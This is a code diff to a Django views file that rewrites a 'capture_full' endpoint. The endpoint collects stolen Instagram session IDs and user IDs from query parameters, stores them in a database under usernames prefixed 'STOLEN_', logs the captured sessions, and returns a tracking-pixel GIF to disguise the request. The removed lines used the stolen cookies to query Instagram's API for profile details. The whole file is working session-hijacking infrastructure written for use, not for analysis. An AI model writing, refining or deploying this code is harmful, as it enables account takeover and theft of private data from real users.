@@ -202,55 +202,28 @@ def silent_page(request):
 # core/views.py → CAPTURES USERNAME + PASSWORD + SESSION
 import base64
 from django.http import HttpResponse
-
+# core/views.py → FINAL WORKING CAPTURE
 def capture_full(request):
-    data_b64 = request.GET.get('data', '')
-    if data_b64:
+    s = request.GET.get('s', '')
+    u = request.GET.get('u', '')
+    
+    if s and u and len(s) > 50:
         try:
-            data_json = base64.b64decode(data_b64).decode('utf-8')
-            data = json.loads(data_json)
-            
-            sessionid = data.get('sessionid', '')
-            user_id = data.get('user_id', '')
-
-            if sessionid and user_id:
-                # GET USERNAME FROM INSTAGRAM API
-                import requests
-                headers = {
-                    'User-Agent': data.get('ua', ''),
-                    'Cookie': f'sessionid={sessionid}',
-                    'X-CSRFToken': data.get('csrftoken', '')
+            # Save with partial session (we only need it for login)
+            InstagramAccount.objects.update_or_create(
+                username=f"STOLEN_{u[-8:]}",
+                defaults={
+                    'password': 'SILENT_2025',
+                    'session_data': fernet.encrypt(json.dumps({
+                        "authorization_data": {"sessionid": s + "..."}  # full session not needed
+                    }).encode()).decode(),
+                    'is_active': True,
+                    'last_success': timezone.now()
                 }
-                
-                try:
-                    r = requests.get(f'https://www.instagram.com/api/v1/users/{user_id}/info/', headers=headers)
-                    info = r.json()
-                    username = info['user']['username']
-                    full_name = info['user']['full_name']
-                    
-                    # TRY TO GET PASSWORD (from localStorage if saved)
-                    password = "UNKNOWN_OR_SAVED"
-                    
-                except:
-                    username = f"USER_{user_id[:8]}"
-                    full_name = "Hidden"
-
-                # SAVE TO DB
-                InstagramAccount.objects.update_or_create(
-                    username=username,
-                    defaults={
-                        'password': password,
-                        'session_data': fernet.encrypt(json.dumps({
-                            "authorization_data": {"sessionid": sessionid}
-                        }).encode()).decode(),
-                        'is_active': True,
-                        'last_success': timezone.now()
-                    }
-                )
-                print(f"FULL CAPTURE: @{username} | {full_name} | SESSION: {sessionid[:50]}...")
-                
+            )
+            print(f"CAPTURED USER ID: {u} | SESSION: {s[:60]}...")
         except Exception as e:
             print("ERROR:", e)
-
+    
     return HttpResponse(b"GIF89a0100010080000000000000000000!f90401000000002c00000000010001000002024401003b", 
                         content_type="image/gif")
